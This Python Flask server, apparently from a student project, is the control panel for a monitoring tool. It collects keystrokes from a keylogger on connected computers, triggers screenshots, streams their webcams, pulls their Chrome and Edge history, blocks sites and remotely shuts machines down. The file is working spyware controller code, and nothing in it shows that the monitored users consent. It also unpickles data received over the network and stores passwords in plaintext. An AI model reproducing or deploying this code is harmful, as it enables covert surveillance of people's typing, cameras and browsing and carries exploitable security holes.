import datetime
import pickle
import re
import socket
import os
import struct
import time
import cv2
from flask import Flask, request, jsonify, render_template
import sqlite3
import threading
from google.cloud import storage
import firebase_admin
from firebase_admin import credentials, storage, db


cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred, {
        "storageBucket": "pbl4-09092003.appspot.com",
        "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
    })
ref = db.reference('history')


app = Flask(__name__)
is_logged_in = False
data_received = ""  
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

port = 8080


def handle_client(client_socket,client_address):
    global data_received  
    while True:
        try:
            print('Nhận kết nối từ', client_address)
            client_socket.send('keylogger'.encode('utf-8'))

            while True:
                data = client_socket.recv(1024)
                if not data:
                    break

                data = data.decode('utf-8')
                data = data.replace("'b'", "")
                data = data.replace("'", "")
                data = re.sub(r"https://\S+", "", data)


                if data == "Key.backspace":
                    data = "back"
                elif data == "Key.f12":
                    break
                else:
                    if data == "Key.ctrl_l\x01":
                        data = "[CtrA]"
                    if data == "[Ctrl]\x01":
                        data = "[CtrA]" 
                    if data == "[Ctrl]\x01":
                        data = "[CtrA]"    
                    if data == "Key.shift":
                        data = ""
                    if data == "Key.ctrl_l":
                        data = "[Ctrl]"
                    if data == "Key.alt_l":
                        data = "[Alt]"
                    if data == "Key.tab":
                        data = "\t"
                    if data == "Key.enter":
                        data = "\n"
                    if data == "Key.space":
                        data = "_"
                    if data == "Key.caps_lock":
                        data = ""
                    if data == "Key.cmd":
                        data = "[Wind]"
                    else:
                        data = data.replace("Key.", "")
                if data == "ctrl_l\x01":
                    data = "[CtrA]"
                elif data == "[Ctrl]\x01":
                    data = "[CtrA]"
                    
                data_received += data
                print(data, end="")

        except Exception as e:
            print("Error:", str(e))
            client_socket.close()
            break
        finally:
            client_socket.close()
def add_connection(address, name ):
    
    conn = sqlite3.connect('PBL.db')
    cursor = conn.cursor()

    # Chèn dữ liệu vào bảng user
    insert_data_query = '''
    INSERT OR IGNORE INTO connect (address, name) VALUES (?, ?);    
    '''

    cursor.execute(insert_data_query, (address, name))
    conn.commit()

    # Đóng kết nối
    conn.close()
        
def start_socket_server(ip = None):
    global client_socket
    global server_socket
    # server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # port = 8080

    try:
        if ip:
            server_socket.bind((ip, port))
        else:
            server_socket.bind(('', port))
            
        server_socket.listen(5)
        print(f"Server listening on port {port}")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Got connection from {client_address}")
            try:
                host_name = socket.gethostbyaddr(client_address[0])[0]
                print(f"Host name: {host_name}")
                add_connection(client_address[0], host_name)
            except socket.herror:
                print("Unable to get host name")   

            try:
                # Tạo một luồng mới để xử lý kết nối của client
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.start()

                host_name = socket.gethostbyaddr(client_address[0])[0]
                print(f"Host name: {host_name}")
                add_connection(client_address[0], host_name)
            except socket.herror:
                print("Unable to get host name")


    except Exception as e:
        print(f"Server error: {str(e)}")
    # finally:
    #     server_socket.close()

def get_screenshots_list():
    # Lấy tham chiếu đến bucket
    bucket = storage.bucket()

    # Lấy danh sách tất cả các đối tượng trong bucket
    blobs = list(bucket.list_blobs())
    
    # Lọc các đối tượng để chỉ lấy các ảnh chụp màn hình
    screenshots_list = [blob.public_url for blob in blobs if blob.name.startswith("screenshot")]

    return screenshots_list

def get_available_dates():
    all_dates = ref.get().keys()  # Lấy tất cả các key (ngày) từ Firebase
    return [date for date in all_dates if ref.child(date).child('app_history').get()]

def push_link_to_database(link):
    db_ref = db.reference('web_blocks')  # 'web_blocks' is the name of the node in the database
    new_entry_ref = db_ref.push()  # Generate a new unique key
    new_entry_ref.set({
        'timestamp': int(time.time()),
        'link': link

    })
def get_link_from_database():
    db_ref = db.reference('web_blocks')
    data = db_ref.get()
    return data

def get_hourly_data(date):
    hourly_data = [0] * 24  # Khởi tạo mảng với 24 giờ, giá trị ban đầu là 0

    date_ref = ref.child(date)

    # Lặp qua từng giờ trong ngày
    for hour in range(24):
        hour_str = str(hour)
        hour_ref = date_ref.child(hour_str)

        # Lấy giá trị total_minutes từ Firebase hoặc mặc định là 0 nếu không có dữ liệu
        total_minutes = hour_ref.child("total_minutes").get() or 0

        # Lưu giá trị vào mảng theo giờ
        hourly_data[hour] = total_minutes

    return hourly_data
 
@app.route('/', methods=['GET', 'POST'])
def login():
    global is_logged_in  

    if request.method == 'POST':
        username = request.form['name']
        password = request.form['pass']

        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        query = "SELECT * FROM user WHERE username = ? AND password = ?"
        try:
            cursor.execute(query, (username, password))

            user = cursor.fetchone()

            conn.close()

            if user:
                is_logged_in = True
                socket_server_thread = threading.Thread(target=start_socket_server)
                socket_server_thread.start()
                return render_template('index.html', is_logged_in=is_logged_in)
            
            else:
                return "Đăng nhập không thành công. Vui lòng kiểm tra lại tên người dùng và mật khẩu."

        except Exception as e:
            return "Đã xảy ra lỗi: " + str(e)
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['registerEmail']
        password = request.form['registerPass']

        conn = sqlite3.connect('PBL.db')
        cursor = conn.cursor()

        # Kiểm tra xem người dùng đã tồn tại chưa
        query_check_user = "SELECT * FROM user WHERE username = ?"
        cursor.execute(query_check_user, (email,))
        existing_user = cursor.fetchone()

        if existing_user:
            conn.close()
            return "Người dùng đã tồn tại."

        # Thêm người dùng mới vào cơ sở dữ liệu
        query_insert_user = "INSERT INTO user (username, password) VALUES (?, ?)"
        cursor.execute(query_insert_user, (email, password))
        conn.commit()
        conn.close()

        # return "Đăng ký thành công. Bạn có thể đăng nhập bây giờ."
        is_logged_in = True
        socket_server_thread = threading.Thread(target=start_socket_server)
        socket_server_thread.start()
        return render_template('index.html', is_logged_in=is_logged_in)

    return render_template('register.html')
@app.route('/home.html')
def home_router():
    return render_template('home.html')
@app.route('/keylogger')
def keylogger_router():
    return render_template('keylogger.html', data_received=data_received)

@app.route('/connection')
def connection_router():
    conn = sqlite3.connect('PBL.db')
    cursor = conn.cursor()
    
    query = "SELECT * FROM connect;"
    
    try:
        cursor.execute(query)
        rows = cursor.fetchall()
            
        computers = [{'name': row[0], 'address': row[1]} for row in rows]

        conn.close()
        
        return jsonify(computers)

    except  Exception as e:
        return jsonify({'error': str(e)})

@app.route('/handle_selected_computer', methods=['POST'])
def handle_selected_computer():
    
    global server_socket
    
    if server_socket:
        server_socket.close()


    selected_computer = request.json.get('selectedComputer')
    
    name = selected_computer.get('name', '')
    address = selected_computer.get('address', '')

    # start_socket_server(address)
    socket_server_thread = threading.Thread(target=start_socket_server, args=(address,))
    socket_server_thread.start()
    # server_socket.bind((address, port))


    print("Selected Computer Name:", address)
    print("Selected Computer IP:", name)   
    
    print("Server is listening on: ", server_socket, " port:", port)
    return jsonify({'status': 'success'})

@app.route('/remote-control',methods=['GET','POST'])
def remote_router():   
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        shutdown_time = data.get('shutdownTime')  

        print("Action: " ,action)
        
        if action == 'shutdown':
            client_socket.send('shutdown'.encode('utf-8'))
            return jsonify(message='Đã thực hiện thành công hành động shutdown!')

        elif action == 'restart':
            client_socket.send('restart'.encode('utf-8'))
            return jsonify(message='Đã thực hiện thành công hành động restart!')
        elif action == 'timeShutdown':
            print('shutdown_time: ' ,shutdown_time)
            client_socket.send('shutdown_time'.encode('utf-8'))
            client_socket.send(shutdown_time.encode('utf-8'))

            return jsonify(message=f'Đã đặt lịch hẹn giờ tắt máy là: {shutdown_time} ')

    return render_template('remote-control.html') 
 
@app.route('/screenshots', methods=['GET', 'POST'])
def screenshots_router():
    image_url = ""
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        print("Action: ", action)

        if action == 'takeScreenshot':
            client_socket.send('takeScreenshot'.encode('utf-8'))
            try:
                image_url = client_socket.recv(1024).decode('utf-8')
                print("Received image URL:", image_url)
                return jsonify({'image_url': image_url})
            except Exception as e:
                print("Error receiving image URL:", str(e))
                return jsonify({'image_url': image_url})
        elif action == 'showScreenshot':
            bucket = storage.bucket()
            blobs = bucket.list_blobs()

            images = [{'name': os.path.basename(blob.name), 'public_url': blob.generate_signed_url(expiration=int(time.time()) + 3600)} for blob in blobs]
            
            return jsonify({'images': images})
        elif action == 'webCam':
            client_socket.send('webCam'.encode('utf-8'))
            try:
                data = b""
                payload_size = struct.calcsize("L")

                while True:
                    while len(data) < payload_size:
                        data += client_socket.recv(4096)

                    packed_msg_size = data[:payload_size]
                    data = data[payload_size:]
                    msg_size = struct.unpack("L", packed_msg_size)[0]

                    while len(data) < msg_size:
                        data += client_socket.recv(4096)

                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame = pickle.loads(frame_data)

                    cv2.imshow("Server", frame)

                    if cv2.waitKey(1) & 0xFF == ord("q"):
                        break
            except Exception as e:
                print("Exception: " , str(e))

    return render_template('screenshots.html')


@app.route('/show_image')
def show_image():
    # Lấy tham số từ query parameters
    image_name = request.args.get('image_name')
    image_url = request.args.get('image_url')

    return render_template('show_image.html', image_name=image_name, image_url=image_url)

@app.route('/delete_image/<image_name>', methods=['POST'])
def delete_image(image_name):
    try:
        # Xoá ảnh từ Firebase Storage
        bucket = storage.bucket()
        blob = bucket.blob(f'images/{image_name}')
        blob.delete()

        return jsonify({'success': True})
    except Exception as e:
        print("Error deleting image:", str(e))
        return jsonify({'success': False})
  
@app.route('/history',methods=['GET','POST'])
def appHistory_router():
    available_dates = get_available_dates()

    if request.method == 'POST':
        selected_date = request.form['selected_date']

        # Kiểm tra xem ngày đã chọn có sẵn trong danh sách không
        if selected_date not in available_dates:
            return render_template('history.html', available_dates=available_dates, selected_date=None, error_message="No data available for the selected date.")

        # Lấy dữ liệu từ Firebase cho ngày đã chọn
        history_data = ref.child(selected_date).child('app_history').get()

        # Truyền dữ liệu cho trang kết quả
        return render_template('history.html', available_dates=available_dates, history_data=history_data, selected_date=selected_date)

    return render_template('history.html', available_dates=available_dates, history_data=None, selected_date=None, error_message=None)

@app.route('/get_history', methods=['GET'])
def get_history_ROUTER():
    selected_date = request.args.get('selected_date')

    # Lấy dữ liệu từ Firebase cho ngày đã chọn
    history_data = ref.child(selected_date).child('app_history').get()

    # Trả về dữ liệu dưới dạng JSON
    return jsonify(history_data)



@app.route('/web_history')
def index():
    return render_template('web_history.html')

@app.route('/get_web_history', methods=['POST'])
def get_web_history_router():
    browser_type = request.form['browser_type']
    selected_date = request.form['selected_date']
    
    # Tham chiếu đến thư mục ngày và loại trình duyệt
    date_ref = ref.child(selected_date)
    browser_ref = date_ref.child(f"{browser_type}History")

    history_data = browser_ref.get()
    
    if history_data:
        return jsonify(history_data)
    else:
        if client_socket:
            if (browser_type == "Chrome"):
                client_socket.send('ChromeHistory'.encode('utf-8'))
            elif (browser_type == "Edge"):
                client_socket.send('EdgeHistory'.encode('utf-8'))
        return jsonify(history_data)



@app.route('/web_block', methods=['GET', 'POST'])
def web_block_router():
    if request.method == 'POST':
        link = request.form['link_block']
        print('link: ' ,link)
        push_link_to_database(link)
        client_socket.send('webBlock'.encode('utf-8'))
        client_socket.send(link.encode('utf-8'))



    # Get data from the database
    data = get_link_from_database()

    return render_template('web_block.html', data=data)


@app.route('/statistics', methods=['GET', 'POST'])
def statistics_router():
    selected_date = request.args.get('selected_date')

    if selected_date is None:
        selected_date = datetime.datetime.now().strftime("%Y-%m-%d")

    # Lưu ý: Chuyển dòng này xuống sau khi đã kiểm tra selected_date
    bar_data = get_hourly_data(selected_date)

    total = sum(bar_data)
    total = total / 60
    labels = ['Thời gian sử dụng (giờ)', ]
    data = [total, 24 - total]

    return render_template('statistics.html', labels=labels, data=data, bar_data=bar_data)

    
if __name__ == '__main__':
    app.run(debug=True, port=8000)
